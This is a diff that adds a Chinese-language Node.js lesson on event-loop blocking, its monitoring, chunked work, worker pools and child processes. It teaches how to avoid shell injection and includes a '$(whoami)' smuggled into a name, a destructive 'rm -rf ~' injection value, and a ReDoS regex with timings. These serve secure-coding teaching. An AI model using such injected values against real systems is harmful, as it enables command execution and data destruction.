@@ -1,0 +1,456 @@
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="icon" href="data:,">
+<title>9. 別卡住 event loop：worker 與子程序</title>
+<link rel="stylesheet" href="../../style.css">
+</head>
+<body data-lesson="9" data-practice="node">
+<header>
+  <div class="eyebrow">階段 2：非同步與 event loop · 第 9 課</div>
+  <h1>別卡住 event loop：worker 與子程序</h1>
+</header>
+<main>
+
+<p>咖啡店的後台加了「每日報表」：老闆按一下，伺服器把當天幾百萬筆訂單算成各品項營收和尖峰時段。上線第一天，老闆一按報表，點餐平板就轉圈圈轉了一秒多，所有客人的訂單都卡住。報表算出來的數字是對的，點餐的程式也沒有改過，兩件看起來無關的事卻綁在一起：報表算多久，所有客人就等多久。</p>
+<p>這一課從頭到尾處理這個事故：先弄懂為什麼一份報表能卡住所有人、怎麼用數字證明是它，再用三種方法把報表從客人的路上移開：切成小段、交給另一條執行緒、交給另一個程序。最後你會知道遇到慢的工作該選哪一種。</p>
+
+<div class="callout"><strong>這課的路線：</strong>
+<ol>
+  <li>為什麼一份報表會讓所有客人一起卡住？怎麼用數字證明是 event loop 被卡住，而不是資料庫慢？</li>
+  <li>除了報表這種自己寫的迴圈，還有哪些看起來普通的一行程式會卡住？</li>
+  <li>解法一：報表還在原本的執行緒算，但切成小段，讓點餐插得進來；代價是還是只用一顆 CPU。</li>
+  <li>解法二：把報表交給 worker 執行緒算；很多人同時按報表時，用固定大小的 worker pool 排隊。</li>
+  <li>解法三：開發票的舊程式不是 JavaScript，用子程序呼叫它，不讓客人姓名變成 shell 指令；最後整理怎麼選。</li>
+</ol></div>
+
+<div class="callout"><strong>這課會用到：</strong>
+<ul>
+  <li><a href="07-event-loop.html">第 7 課</a>的 event loop：<code>setImmediate</code> 排到下一輪 loop，microtask 在離開目前這段 callback 前就全部清空；檔案、雜湊這類工作交給預設 4 條的 thread pool。</li>
+  <li><a href="02-process-config.html">第 2 課</a>的程序與結束碼：正常結果印 stdout、錯誤印 stderr，結束碼 0 才是成功，SIGTERM 要求程式結束。</li>
+  <li><a href="08-events-cancellation.html">第 8 課</a>的事件與 <code>AbortSignal</code>：用 <code>on('事件', 監聽器)</code> 等通知、用 signal 取消等待，結束時要把監聽器拿掉。</li>
+</ul></div>
+
+<h2>為什麼一份報表會讓所有客人一起卡住？</h2>
+<p>先把事故重現出來。在 <code>learn/</code> 執行 <code>node check.mjs node 09</code> 建立 <code>work/09/</code>，然後在 <code>work/09</code> 執行 <code>node examples/blocking-server.ts</code>。這個伺服器有兩個網址：<code>/menu</code> 代表客人點餐，什麼都不算、立刻回應；<code>/report</code> 代表老闆按報表，同步算 300 萬筆訂單。另開一個終端機，先送報表，0.2 秒後再點一次菜單：</p>
+<pre>$ curl localhost:3000/report &amp; sleep 0.2; curl -w 'menu 花了 %{time_total}s\n' localhost:3000/menu
+menu ok
+menu 花了 1.440128s</pre>
+<p>伺服器那邊印出：</p>
+<pre>/report 處理了 1661ms
+延遲 max 1670ms、p99 1670ms；ELU 78%
+/menu 處理了 0ms</pre>
+<p>第二行先不用看，下一節解釋。重點是第一行和第三行的對比：<code>/menu</code> 自己只花 0ms，客人卻等了 1.4 秒。這 1.4 秒全部花在排隊：<code>/menu</code> 的請求在 <code>/report</code> 開始算之後才到，一直等到報表算完才被處理。（這台 v24.22.1 實測，數字每次會有些差異。）</p>
+<p>為什麼要排隊？因為 Node 執行你寫的 JavaScript 只用一條執行緒。<a href="07-event-loop.html">第 7 課</a>看過 event loop 怎麼運作：這條執行緒跑完一段 callback，回到 event loop 看看有什麼新事件（新的連線、到期的計時器、讀完的檔案），再挑下一段 callback 來跑。只要某段 callback 還沒跑完，event loop 就回不來，新事件只能在外面等。</p>
+<p>平常這不是問題，因為大多數 callback 都很短。處理一個查訂單的請求，JavaScript 只要做「組好 SQL、送出去」這幾微秒的事，接著就交出執行緒等資料庫回應；等待的這段時間，執行緒去處理別人的請求。所以一個 Node 程序能同時顧上千個連線。</p>
+<p>報表不一樣。<code>computeDailyReport</code> 是一個跑 300 萬次的迴圈，中間沒有任何「等」的地方，執行緒從頭到尾都在<em>算</em>，一次也沒有回到 event loop。這種狀態叫做<strong>阻塞</strong>（blocking）：執行緒被一段同步的程式佔住，計時器不會觸發、新的請求不會被讀進來，所有人一起停住。像只有一個收銀台的咖啡店，店員在幫一位客人算一整年的帳，後面排隊的人連「一杯美式」都點不了。</p>
+<p>從這裡可以把後端的工作分成兩種：</p>
+<ul>
+  <li><strong>I/O 密集</strong>（I/O-bound）：時間主要花在等待，例如查資料庫、呼叫外部 API、讀檔案。等待時執行緒是空的，Node 很擅長這種工作。</li>
+  <li><strong>CPU 密集</strong>（CPU-bound）：時間主要花在計算，例如報表、壓縮、加密、解析大檔。計算時執行緒是滿的，在 Node 裡會擋住所有人。</li>
+</ul>
+<p>所以這個事故的答案已經出來了：報表本身沒錯，錯在它在<em>唯一那條執行緒</em>上一口氣算完。要修，就是讓報表不要一口氣佔住這條執行緒：要嘛讓它算一段就讓出來，要嘛把它搬到別的執行緒或程序去算。後面三種解法就是這兩個方向。</p>
+<p>不過在動手修之前，還有一個問題：這次是我們自己重現才知道是報表。正式環境裡，客服只會說「網站有時候會卡」，你怎麼知道是 event loop 被卡住，而不是資料庫慢、網路慢？</p>
+
+<h2>怎麼證明是 event loop 被卡住，而不是資料庫慢？</h2>
+<p>兩種情況在使用者眼裡都是「慢」，但原因和修法完全不同：資料庫慢，要去看查詢和索引；event loop 被卡住，要找出佔住執行緒的那段程式。所以要有一個只在「執行緒被佔住」時才會升高的數字。Node 的 <code>node:perf_hooks</code> 提供兩個，剛才範例伺服器每 2 秒印一次的就是它們。</p>
+
+<h3>event loop 延遲：計時器晚了多久</h3>
+<p>想法是這樣：排一個 10ms 後觸發的計時器。如果執行緒是空的，它會準時在 10ms 觸發；如果執行緒被報表佔住 1.6 秒，它要等報表算完、event loop 回來才觸發，就會晚 1.6 秒。計時器晚了多久，就是執行緒被佔住多久。這叫做 <strong>event loop 延遲</strong>（event loop delay）。</p>
+<p>注意它只對「執行緒被佔住」有反應。查資料庫等了 3 秒時，執行緒是空的，計時器照樣準時，延遲不會升高。這正是區分兩種「慢」的關鍵。</p>
+<p><code>monitorEventLoopDelay()</code> 幫你做這件事：每隔 <code>resolution</code> 毫秒（預設 10）排一次計時器，記錄它每次實際晚了多久。量到的值很多，所以它不是存成一個數字，而是存成<strong>直方圖</strong>（histogram）：統計每個延遲值出現了幾次，之後可以問「最大是多少」「大多數落在哪裡」。值的單位是奈秒，除以 <code>1e6</code> 變毫秒。</p>
+<p>從直方圖要看兩個數字：</p>
+<ul>
+  <li><code>max</code>：這段時間最糟的一次。上面的 1670ms 就是 <code>/report</code> 卡住的時間。</li>
+  <li><code>percentile(99)</code>：第 99 百分位，常寫成 p99，意思是 99% 的取樣都比它小。只看平均會被大量正常的取樣稀釋，看不出偶爾的卡頓；只看 max 又可能被單一次意外影響。p99 告訴你「最慢的那 1% 有多慢」，是監控最常用的指標。</li>
+</ul>
+
+<h3>event loop 使用率：執行緒有多忙</h3>
+<p>延遲回答的是「卡了多久」，另一個問題是「整體有多忙」。<strong>event loop 使用率</strong>（event loop utilization，ELU）是 event loop 有多少比例的時間在跑 JavaScript，而不是空著等事件。<code>performance.eventLoopUtilization()</code> 回傳累計的數字；把前一次的結果傳進去，就能算出這一段時間的使用率。上面的 78% 代表那 2 秒裡有 78% 的時間執行緒在算。接近 100% 代表這個程序的 CPU 已經不夠用了：就算沒有單一次很長的卡頓，所有請求也都在搶時間。</p>
+<p>兩個數字合起來的量法：</p>
+<pre>import { monitorEventLoopDelay, performance } from 'node:perf_hooks'
+
+const delay = monitorEventLoopDelay({ resolution: 10 })
+delay.enable()
+let last = performance.eventLoopUtilization()
+setInterval(() =&gt; {
+  const now = performance.eventLoopUtilization()
+  const elu = performance.eventLoopUtilization(now, last).utilization
+  last = now
+  console.log(delay.max / 1e6, delay.percentile(99) / 1e6, elu)
+  delay.reset()
+}, 2_000)</pre>
+<p>每 2 秒印一次，印完 <code>reset()</code> 清空直方圖，下一次印的就是下一個 2 秒的狀況。<code>last</code> 記住上一次的 ELU，讓每次算的都是「這 2 秒」的使用率，而不是從啟動到現在的平均。</p>
+<p>回到判斷：延遲的 max 或 p99 衝到幾百毫秒以上、ELU 又很高，就是 event loop 被同步的工作佔住；延遲正常、只有某支 API 慢，就是那支 API 在等外部的東西。正式環境會把這兩個數字送進監控系統，延遲超過幾十毫秒就告警。知道「是 event loop 被卡住」之後，要找出是哪一段程式在佔 CPU，是 <a href="23-profiling-memory.html">第 23 課</a>教的 profile。</p>
+<p>報表是我們自己寫的大迴圈，算它很慢不意外。但監控告警時，兇手不一定是這麼明顯的迴圈：有些卡住 event loop 的程式，看起來只是很普通的一行。</p>
+
+<h2>除了報表，還有哪些普通的一行程式會卡住？</h2>
+<p>判斷標準跟報表一樣：只要一段程式在執行緒上同步跑很久、中間不回到 event loop，就會卡住所有人。下面幾種在日常程式碼裡很常見，而且本機資料少時都很快，上線後才出事：</p>
+<div class="table-wrap"><table>
+  <tr><th>來源</th><th>例子</th><th>怎麼辦</th></tr>
+  <tr><td>CPU 迴圈</td><td>報表、排序幾百萬筆、圖片處理</td><td>本課的三種解法</td></tr>
+  <tr><td><code>*Sync</code> API</td><td><code>fs.readFileSync</code>、<code>crypto.pbkdf2Sync</code>、<code>zlib.gzipSync</code>、<code>execSync</code></td><td>處理請求時一律用非同步版本，工作會交給 thread pool 或作業系統。這台 <code>pbkdf2Sync</code> 跑 60 萬次約 0.2 秒，期間全部停住</td></tr>
+  <tr><td>超大 JSON</td><td>36MB 的訂單陣列：<code>JSON.stringify</code> 約 0.28 秒、<code>JSON.parse</code> 約 0.32 秒（本機實測）</td><td>限制請求大小、分頁，或用 stream（<a href="16-streams-backpressure.html">第 16 課</a>）</td></tr>
+  <tr><td>正規表示式</td><td>下面的 ReDoS</td><td>改寫規則、限制輸入長度（<a href="25-security.html">第 25 課</a>）</td></tr>
+</table></div>
+<p><code>*Sync</code> API 是最常見的一種。Node 大多數 I/O API 都有兩個版本：非同步版本把工作交給 thread pool 或作業系統，JavaScript 執行緒先去做別的事；<code>Sync</code> 版本則讓 JavaScript 執行緒自己停在那裡等結果。等的時間再短，乘上每個請求，就是所有人一起等。</p>
+<p>這不代表 <code>Sync</code> 不能用。啟動階段用 <code>readFileSync</code> 讀設定沒關係：那時伺服器還沒開始收請求，沒有人在等。規則是「處理請求的路徑上不要有同步的重工作」。</p>
+<p>超大 JSON 容易被忽略，因為 <code>JSON.parse</code> 和 <code>JSON.stringify</code> 看起來只是一個函式呼叫。但它們是同步的，要逐字讀過或組出整份字串，資料越大花越久，期間一樣不回到 event loop。</p>
+<p>正規表示式是最隱密的一種。正規表示式（<a href="../../typescript/lessons/05-numbers-money.html">TypeScript 課第 5 課</a>）的引擎遇到「好幾種切法都可能符合」的規則時，會一種一種試，叫做<strong>回溯</strong>（backtracking）。大多數規則要試的組合很少；但有些規則在特定輸入下，要試的組合數會指數成長，叫做<strong>災難性回溯</strong>。有人故意送這種輸入讓伺服器卡死，叫做 <strong>ReDoS</strong>（Regular expression Denial of Service，用正規表示式造成的阻斷服務）。執行 <code>node examples/redos.ts</code>：</p>
+<pre>/^(\w+\s?)*$/ 對 'a'.repeat(n) + '!'
+22 個 a：27.3ms
+24 個 a：103.0ms
+26 個 a：464.4ms
+28 個 a：2422.3ms</pre>
+<p>只是 29 個字元的字串，卡住超過一秒，每多兩個字母時間約變四到五倍。問題出在 <code>(\w+\s?)*</code>：<code>\s?</code> 可以不出現，所以 <code>aaaa</code> 可以切成 <code>a|aaa</code>、<code>aa|aa</code>、<code>a|a|a|a</code>…，結尾的 <code>!</code> 讓每一種切法都失敗，引擎只好全部試完。字串越長，切法越多。而這段時間跟報表一樣，是在唯一那條執行緒上同步發生的。</p>
+
+<div class="callout practice"><strong>💡 實務上：code review 時先找請求路徑上的同步重工作</strong><br>這類問題很少在開發時被發現：本機只有幾十筆訂單，<code>JSON.parse</code> 一整份、<code>readFileSync</code> 都很快，上線資料變多才開始卡。資深工程師 review 時會順著 handler 看：有沒有 <code>*Sync</code>、有沒有一次撈全部資料再排序或組大 JSON、有沒有拿使用者輸入去跑正規表示式。從網路上複製來的正規表示式要特別小心，套用在 email、網址這種使用者可以亂填的欄位前，先限制輸入長度。客服回報「整個網站偶爾卡一兩秒」而不是「某一頁很慢」時，就該先懷疑 event loop 被卡住。</div>
+
+<p>上面這些多半可以靠「換非同步版本」「限制大小」「改寫規則」解決。報表不行：幾百萬筆訂單就是要算，換不掉。下一步回到報表本身，從最簡單的解法開始：不搬到別處，只讓它別一口氣算完。</p>
+
+<h2>解法一：報表能不能算一段就讓出來，讓點餐插得進來？</h2>
+<p>第一節說過，阻塞的原因是報表的迴圈一次都沒有回到 event loop。那最直接的修法是：迴圈每處理一段，就主動回到 event loop 一次，讓排隊的請求被處理，再回來算下一段。這叫做<strong>分段處理</strong>（partitioning）。報表還是在原本的執行緒算，總時間差不多，但不再一口氣佔住。</p>
+<p>關鍵是「回到 event loop」要用對東西。<a href="07-event-loop.html">第 7 課</a>學過，<code>setImmediate</code> 的 callback 排在下一輪 loop 的 check phase。<code>await</code> 一個 <code>setImmediate</code> 時，目前這段程式先停下來，等 event loop 走到 check phase 才被叫醒；之後每一段都在 check phase 裡排下一個 <code>setImmediate</code>，要等下一輪才會執行，所以兩段之間 event loop 會經過計時器和網路 I/O 的 phase。客人的 <code>/menu</code> 請求就在這中間被讀進來、處理掉。</p>
+<pre>import { setImmediate as nextLoop } from 'node:timers/promises'
+
+for (let start = 0; start &lt; items.length; start += 5_000) {
+  // 處理 items[start] 到 items[start + 4999]
+  await nextLoop()   // 讓出：其他工作在這裡插進來
+}</pre>
+
+<h3>為什麼加 async 或 await 一個 Promise 不算讓出？</h3>
+<p>這是分段處理最常寫錯的地方，有兩種誤會：</p>
+<ul>
+  <li><strong>加 <code>async</code> 不會讓計算移到背景</strong>：<code>async function</code> 只是讓函式回傳 Promise，裡面的程式還是在呼叫的當下、在同一條執行緒上同步跑，直到第一個 <code>await</code>。如果裡面沒有 <code>await</code>，整個迴圈跑完才回傳，跟沒加一樣卡。</li>
+  <li><strong><code>await Promise.resolve()</code> 和 <code>queueMicrotask</code> 不算讓出</strong>：它們排的是 microtask。第 7 課教過，Node 在離開目前這段 callback、進入下一個 phase 之前，會把 microtask 全部跑完。所以迴圈 await 一個 microtask 後，馬上就在同一段時間裡被叫醒、繼續下一段；event loop 根本沒機會走到處理計時器和網路的 phase。迴圈每段都這樣做，整個迴圈還是一口氣跑完，客人一樣輪不到。</li>
+</ul>
+<p>判斷方法：讓出用的東西，要能讓 event loop 走完一輪。<code>setImmediate</code> 可以，microtask 不行。</p>
+
+<h3>一段要切多大？</h3>
+<p>這是一個取捨。段太大，其他請求要等一整段算完才插得進來，卡頓只是變短，沒有消失。段太小，讓出本身的成本會比工作還多：每次 <code>await</code> 一個 <code>setImmediate</code> 要十幾微秒。這台電腦每筆都讓出一次時，40 萬筆從 0.2 秒變成快 7 秒。常見的目標是每段幾毫秒：對客人來說幾毫秒的等待感覺不到，對報表來說讓出的次數也不會多到拖慢整體。</p>
+<p>分段處理的好處是不用多開任何東西，改幾行就能讓點餐恢復正常。代價是它還是只用一顆 CPU：報表算得一樣久，只是不再擋住別人。如果同時有十個店長按報表，十份報表會輪流用同一條執行緒，每段之間客人雖然插得進來，但執行緒大部分時間都在算報表，ELU 會一直很高，所有請求都變慢。要讓報表真的「在別處算」，就要用到另一顆 CPU。</p>
+
+<h2>解法二：怎麼把報表交給另一條執行緒算？</h2>
+<p>電腦通常有好幾顆 CPU 核心，但 Node 執行你的 JavaScript 只用一條執行緒，其他核心大多閒著。<code>node:worker_threads</code> 讓你在同一個程序裡開另一條執行緒跑 JavaScript，叫做 <strong>worker</strong>。每個 worker 有自己的 V8、自己的 event loop、自己的記憶體，可以跑在另一顆 CPU 上。報表交給 worker 算，主執行緒只負責收請求、把工作交出去、等結果回來回應，算的那 1.6 秒主執行緒都是空的。</p>
+<p>先看最小的例子，確認主執行緒和 worker 怎麼溝通。執行 <code>node examples/worker-hello.ts</code>：</p>
+<pre>import { Worker, isMainThread, parentPort, threadId, workerData } from 'node:worker_threads'
+
+if (isMainThread) {
+  const order = { item: '拿鐵', qty: 2 }
+  const worker = new Worker(new URL(import.meta.url), { workerData: order })
+  worker.on('message', msg =&gt; console.log('主執行緒收到：', msg))
+  worker.on('error', err =&gt; console.error('worker 丟錯：', err.message))
+  worker.on('exit', code =&gt; console.log('worker 結束，結束碼', code))
+  order.qty = 99   // worker 拿到的是複製品，不受影響
+  console.log('主執行緒 threadId', threadId)
+} else {
+  parentPort!.postMessage({ from: threadId, got: workerData })
+}</pre>
+<pre>主執行緒 threadId 0
+主執行緒收到： { from: 1, got: { item: '拿鐵', qty: 2 } }
+worker 結束，結束碼 0</pre>
+<p>這段程式由上到下發生的事：</p>
+<ul>
+  <li><code>new Worker(檔案)</code>：開一條新執行緒，在裡面從頭執行指定的檔案。這裡指定的是同一個檔案，所以它被執行了兩次：主執行緒裡 <code>isMainThread</code> 是 <code>true</code>，負責建立 worker；worker 裡是 <code>false</code>，負責回訊息。<code>new URL(import.meta.url)</code> 就是目前這個檔案本身（<code>import.meta.url</code> 見<a href="04-modules.html">第 4 課</a>）。如果 worker 的程式放在另一個檔案，就寫 <code>new URL('./x.ts', import.meta.url)</code>：路徑相對於程式檔所在的資料夾，跟從哪裡執行 <code>node</code> 無關。</li>
+  <li><code>workerData</code>：啟動時傳一份資料過去；<code>postMessage</code>／<code>on('message')</code>：之後雙向互傳訊息。worker 裡用 <code>parentPort</code> 跟主執行緒說話。</li>
+  <li><code>threadId</code>：主執行緒是 0，每個 worker 有自己的編號。</li>
+  <li><code>on('error')</code>、<code>on('exit')</code>：worker 出錯或結束時通知主執行緒，輸出最後一行就是 exit。這兩個事件在後面的「worker 出錯或結束時」一節詳細說明。</li>
+</ul>
+<p>輸出裡有一個細節：主執行緒在建立 worker 之後把 <code>qty</code> 改成 99，worker 收到的卻還是 2。這指向 worker 最重要的一個規則。</p>
+
+<h3>資料是複製過去的：要傳什麼給 worker？</h3>
+<p>worker 有自己的記憶體，讀不到主執行緒的變數，兩邊只能傳訊息。訊息會用<strong>結構化複製</strong>（structured clone）整份複製一份過去，規則和 <code>structuredClone()</code> 相同（<a href="../../typescript/lessons/02-values-references.html">TypeScript 課第 2 課</a>）。所以 worker 拿到的是建立當下的複製品，之後主執行緒怎麼改都影響不到它；函式、class 的方法也傳不過去。</p>
+<p>複製會花時間，而且是在主執行緒上做。這台電腦複製 60 萬筆訂單約 0.6 秒，比算報表本身還久。如果把整天的訂單塞進訊息傳給 worker，主執行緒光是複製就又卡住了，等於白搬。</p>
+<p>所以傳給 worker 的東西要小：傳「哪一天」，讓 worker 自己去讀那天的訂單，算完只傳回彙總好的報表。練習的 <code>report-worker.ts</code> 就是這樣設計的。</p>
+
+<h3>worker 出錯或結束時，主執行緒怎麼知道？</h3>
+<p>把報表搬到 worker 之後，報表算到一半出錯，錯誤不會像一般函式那樣 throw 回呼叫端，因為它發生在另一條執行緒上。主執行緒只能透過 worker 物件上的事件知道發生了什麼：</p>
+<ul>
+  <li><code>'error'</code>：worker 裡有沒被 catch 的錯誤，worker 會被終止，錯誤以這個事件送到主執行緒。沒人聽 <code>'error'</code> 時，這個錯誤會在主執行緒丟出，整個伺服器跟著掛掉，所以<strong>一定要聽</strong>。</li>
+  <li><code>'exit'</code>：worker 停止時一定會發，不管是正常結束、出錯還是被終止，帶著結束碼：worker 裡呼叫 <code>process.exit(n)</code> 就是 <code>n</code>（只結束那個 worker，不是整個程序），被 <code>terminate()</code> 是 1。這是 worker 的最後一個事件。</li>
+  <li><code>worker.terminate()</code>：盡快停掉它，回傳 Promise，在 <code>'exit'</code> 時完成。還活著、還在聽訊息的 worker 會讓程序結束不了，所以伺服器關閉時要記得 terminate。</li>
+</ul>
+<p>到這裡，最直覺的寫法是：每個報表請求 <code>new Worker()</code>，收到結果就 <code>terminate()</code>。只有老闆一個人按報表時，這樣完全沒問題。但如果全台分店的店長在月初同時按報表呢？</p>
+
+<h2>很多人同時按報表時，worker 該開幾個？worker pool</h2>
+<p>每個請求都 <code>new Worker()</code> 有兩個代價。第一，開 worker 不便宜：每個都要啟動一個新的 V8、載入模組，要花幾十毫秒和好幾 MB 記憶體。第二，數量沒有上限：同時來 500 個請求就開 500 條執行緒，記憶體爆掉；而 CPU 只有那幾顆，500 條執行緒同時算，只會互相搶 CPU，每一份都更慢。</p>
+<p>正確做法是 <strong>worker pool</strong>：啟動時開固定數量的 worker，重複使用；全部在忙時，新的工作排隊等有空的 worker。</p>
+<figure>
+  <svg viewBox="0 0 700 260" role="img" aria-label="主執行緒把工作放進佇列，有空的 worker 拿走一件，用 id 對應回傳的結果">
+    <defs><marker id="arr9" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="var(--muted)"/></marker></defs>
+    <rect class="d-box" x="20" y="70" width="170" height="120" rx="8"/>
+    <text class="d-text" x="105" y="100" text-anchor="middle">主執行緒</text>
+    <text class="d-small" x="105" y="125" text-anchor="middle">收請求、回應</text>
+    <text class="d-small" x="105" y="145" text-anchor="middle">run(job) → Promise</text>
+    <rect class="d-soft" x="240" y="95" width="170" height="70" rx="8"/>
+    <text class="d-text" x="325" y="122" text-anchor="middle">佇列</text>
+    <text class="d-small" x="325" y="145" text-anchor="middle">id 5、id 6 等著</text>
+    <line class="d-line" x1="190" y1="130" x2="235" y2="130" marker-end="url(#arr9)"/>
+    <rect class="d-box" x="480" y="30" width="190" height="70" rx="8"/>
+    <text class="d-text" x="575" y="58" text-anchor="middle">worker A（忙）</text>
+    <text class="d-small" x="575" y="80" text-anchor="middle">正在算 id 3</text>
+    <rect class="d-box" x="480" y="160" width="190" height="70" rx="8"/>
+    <text class="d-text" x="575" y="188" text-anchor="middle">worker B（忙）</text>
+    <text class="d-small" x="575" y="210" text-anchor="middle">正在算 id 4</text>
+    <line class="d-line" x1="410" y1="120" x2="475" y2="70" marker-end="url(#arr9)"/>
+    <line class="d-line" x1="410" y1="140" x2="475" y2="190" marker-end="url(#arr9)"/>
+    <text class="d-small" x="440" y="85" text-anchor="middle">{ id, job }</text>
+    <path class="d-line" d="M480,45 C300,0 200,20 140,65" fill="none" marker-end="url(#arr9)"/>
+    <text class="d-accent" x="300" y="22" text-anchor="middle">{ id: 3, report }</text>
+  </svg>
+  <figcaption>pool 的四件事：重複使用固定的 worker、沒空就排隊、用 id 把回傳的結果對回原本的請求、worker 死掉就補一個。</figcaption>
+</figure>
+<p>這就是 <a href="../../typescript/lessons/09-async-await.html">TypeScript 課第 9 課</a>的工作池：固定數量的工人輪流從佇列拿工作。放到 worker 上，多了兩件事要處理：</p>
+<ul>
+  <li><strong>用編號對回結果</strong>：一個 worker 會先後處理很多份報表，回傳的只是一則訊息，主執行緒要知道它是哪個請求的答案。所以送出時帶 <code>id</code>，回來時看 <code>id</code> 找到原本那個請求的 Promise，resolve 它。</li>
+  <li><strong>worker 會當掉</strong>：上一節的 <code>'error'</code>、<code>'exit'</code> 在這裡派上用場。worker 當掉時，它手上那份報表永遠不會有結果，要 reject 讓那個請求回錯誤；再補一個新的 worker，不然 pool 會越來越小，最後一個 worker 都不剩，所有報表請求都卡住。</li>
+</ul>
+<p>pool 該開幾個？CPU 密集的工作，同時在算的數量超過 CPU 核心數就沒有幫助，只會互搶。<code>os.availableParallelism()</code> 回傳可用的核心數（<a href="24-scaling.html">第 24 課</a>），通常留一顆給主執行緒收請求。</p>
+<p>練習 2 就是寫這個 pool。正式專案通常直接用成熟的套件 <code>piscina</code>，它還處理了取消、逾時、記憶體上限；自己寫一次，你才知道它替你做了什麼、出問題時該看哪裡。</p>
+
+<div class="callout practice"><strong>💡 實務上：先確認真的是 CPU 在忙，再上 worker</strong><br>工作中最常放進 worker 的是算大報表、匯出 Excel、解析使用者上傳的大 CSV 這類每次都要算、而且算很久的事。但大多數「API 很慢」其實是在等資料庫或外部服務，這時 ELU 不高，開 worker 一點用都沒有，該去看查詢和索引。真的要用時，直接上 <code>piscina</code> 這類套件，把 pool 大小、佇列上限、逾時設好；佇列沒有上限的話，尖峰時請求只會越積越多，記憶體跟著漲。上線後要繼續看 event loop 延遲有沒有真的降下來，確認改對地方。</div>
+
+<p>報表的問題到這裡解決了。但 worker 只能跑 JavaScript。後台另一件重工作是開發票：發票由別的團隊留下的舊程式產生，它是一支獨立的命令列程式，不能 import、也不能改。這種工作要用第三種方法。</p>
+
+<h2>解法三：開發票的舊程式不是 JavaScript 函式，怎麼安全地呼叫它？</h2>
+<p>產生 PDF 的工具、影像轉檔的 ffmpeg、別的團隊留下的舊程式，都是獨立的執行檔，你在終端機打指令執行它們。在 Node 裡做同一件事，是用 <code>node:child_process</code> 啟動另一個程序，叫做<strong>子程序</strong>（child process）。子程序跟你的伺服器是兩個程序，有各自的記憶體，也可以跑在別的 CPU 上；它當掉不會讓你的伺服器程序跟著當掉；但兩者在同一台機器上，CPU 和記憶體還是共用的（下面的實務提醒會談到）。</p>
+<p>啟動子程序有四個 API，差別在「怎麼拿輸出」和「經不經過 shell」：</p>
+<div class="table-wrap"><table>
+  <tr><th>API</th><th>做什麼</th><th>什麼時候用</th></tr>
+  <tr><td><code>spawn(檔案, 參數陣列)</code></td><td>啟動程式，stdout／stderr 是 stream，一邊跑一邊讀</td><td>輸出很大或要即時處理</td></tr>
+  <tr><td><code>execFile(檔案, 參數陣列, 選項, callback)</code></td><td>啟動程式，等它結束，把輸出收集成字串</td><td>輸出不大、要拿到整份結果（最常用）</td></tr>
+  <tr><td><code>exec(一整行指令)</code></td><td>把字串交給 shell（<code>/bin/sh</code>）解讀後執行</td><td>幾乎不要用在有使用者輸入的地方</td></tr>
+  <tr><td><code>fork(模組, 參數陣列)</code></td><td>啟動另一個 Node 程序，多一條<strong>程序間通訊</strong>（IPC，inter-process communication）管道，雙方用 <code>send</code>／<code>on('message')</code> 傳訊息</td><td>Node 寫的工作要完全隔離；<a href="24-scaling.html">第 24 課</a>的 cluster 就是用它</td></tr>
+</table></div>
+<p>開發票的舊程式印一行 JSON 就結束，輸出很小，用 <code>execFile</code> 最適合。但表上的 <code>exec</code> 看起來更方便：直接寫一整行指令就好。為什麼說它幾乎不要用？</p>
+
+<h3>為什麼不能用 exec 把客人姓名串進指令？shell 注入</h3>
+<p>開發票要把客人姓名傳給舊程式，而姓名是客人自己填的。<strong>shell</strong> 是解讀指令的程式，就是你在終端機打字時負責理解那行字的東西。它會把空白當成參數的分隔、把 <code>;</code> 當成「接著執行下一個指令」、把 <code>$()</code> 和反引號當成「先執行裡面的指令，再把結果放進來」。<code>exec</code> 把整行字串交給 shell 解讀，所以使用者輸入如果被串進這行字串，裡面的符號就會被當成指令執行，叫做 <strong>shell 注入</strong>（command injection）。執行 <code>node examples/shell-vs-args.ts</code>（<code>$(whoami)</code> 只會印出帳號名稱，不會造成破壞）：</p>
+<pre>const name = '小明 $(whoami)'
+exec(`echo 你好，${name}`, …)           // exec     → 你好，小明 ken
+execFile('echo', ['你好，', name], …)   // execFile → 你好， 小明 $(whoami)</pre>
+<p><code>exec</code> 真的執行了 <code>whoami</code>，把帳號名稱放進輸出。換成 <code>"; rm -rf ~; echo "</code> 就不好笑了。直覺的修法是用引號把姓名包起來，但擋不住：名字裡自己帶一個引號，就把你的引號提早關掉，後面的內容又回到 shell 的解讀範圍。</p>
+<p>正確做法是根本不經過 shell：<code>execFile</code>／<code>spawn</code> 加<strong>參數陣列</strong>。陣列的每個元素原封不動交給程式當成一個參數，沒有 shell 在中間解讀，裡面的 <code>;</code>、<code>$()</code>、引號都只是普通的字。輸出裡 <code>execFile</code> 印出的就是原本的 <code>$(whoami)</code> 這幾個字。另外不要開 <code>shell: true</code> 選項，那等於又把參數交給 shell，回到 <code>exec</code> 的問題。</p>
+<p>姓名安全了，但舊程式本身也不可靠：它可能卡住不結束，也可能失敗。</p>
+
+<h3>舊程式卡住或失敗時怎麼辦？逾時、結束碼、stderr</h3>
+<p>外部程式是黑盒子，呼叫它的程式碼要自己處理三種狀況：</p>
+<pre>import { execFile } from 'node:child_process'
+import { promisify } from 'node:util'
+const execFileAsync = promisify(execFile)
+
+try {
+  const { stdout } = await execFileAsync(process.execPath, [tool, name], { timeout: 2_000 })
+  return JSON.parse(stdout)
+} catch (err) {
+  // err.code：結束碼；err.killed：是不是被我們終止的；err.stderr：程式說的原因
+}</pre>
+<ul>
+  <li><strong>卡住：逾時</strong>。<code>timeout</code> 預設是 0，意思是永遠等；舊程式卡住，開發票的請求就永遠不回。設了之後，超過時間就送 <code>killSignal</code>（預設 <code>SIGTERM</code>）終止它，Promise 會 reject。也可以傳 <code>signal</code>（<a href="08-events-cancellation.html">第 8 課</a>的 AbortSignal），請求被取消時一起終止子程序。</li>
+  <li><strong>失敗：結束碼</strong>。程式用結束碼告訴呼叫它的人成功了沒，0 才是成功（<a href="02-process-config.html">第 2 課</a>）。promisify 過的 <code>execFile</code> 在結束碼非 0 時 reject，錯誤物件上有 <code>code</code>、<code>stdout</code>、<code>stderr</code>。沒檢查的話，失敗時拿到空的 stdout 還會當成功。</li>
+  <li><strong>失敗的原因：stderr</strong>。程式失敗時通常把原因印在 stderr，例如「未知的品項：珍珠奶茶」。要把它放進錯誤訊息或 log，不然只看到「失敗了」，不知道怎麼修。</li>
+</ul>
